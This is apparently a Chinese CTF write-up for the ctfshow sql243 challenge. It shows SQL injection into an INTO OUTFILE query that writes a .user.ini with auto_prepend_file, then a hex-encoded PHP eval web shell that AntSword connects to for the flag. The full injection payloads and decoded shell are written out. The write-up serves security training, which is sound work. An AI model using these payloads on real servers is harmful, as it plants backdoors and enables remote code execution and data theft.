# ctfshow-sql243



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //备份表
  $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";

```



 返回逻辑 

```
  //过滤了php


上传user.ini
```





```mysql
姿势盲区

SELECT ... INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY 'string']//分隔符
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]





“OPTION”参数为可选参数选项，其可能的取值有：

`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。

`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。



看完了这些东西，就知道该怎么写马了。这三个选项都可以：

FIELDS TERMINATED BY
LINES STARTING BY
LINES TERMINATED BY




网页路径
api/dump.php

filename=.user.ini' LINES STARTING BY ';' TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d72756977656e2e6a70670a0a#

(/*

auto_prepend_file=ruiwen.jpg

*/)
在线字符串转16进制,可以转回车
http://tools.bugscaner.com/text/zifuchuanzhuanhex.html
前面有一个回车，这样auto_prepend_file可以另起一行，不会被注释。最后还有一个回车，这样就和接下来的一行注释分开，是这样
1 ctfshow ctfshow
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
2 user1 111
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
3 user2 222
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
4 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
5 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
6 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
7 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
8 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
9 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
10 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
11 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
12 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
13 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
14 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
15 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
16 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
17 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
18 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
19 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
20 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1
21 userAUTO passwordAUTO
Notice: Undefined offset: 0 in /var/www/html/dump/ruiwen.jpg on line 1




然后再传ruiwen.jpg就可以了，因为过滤了php，可以用短标签或者十六进制绕过
filename=ruiwen.jpg' LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b305d293b3f3e#
(/*<?php eval($_POST[0]);?>*/)


原本dump/index.php显示的是403 Forbidden 是挺坑的 是个假的页面
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->

知道了有了index.php，很容易想到上传.user.ini


蚁剑连接dump/index.php
http://f7bc3ea3-18f4-485b-bc08-9838ecef11f1.challenge.ctf.show:8080/dump/index.php

根目录下/flag.here
ctfshow{157b4123-73ad-438f-9cb5-a8d477b276f5}



```























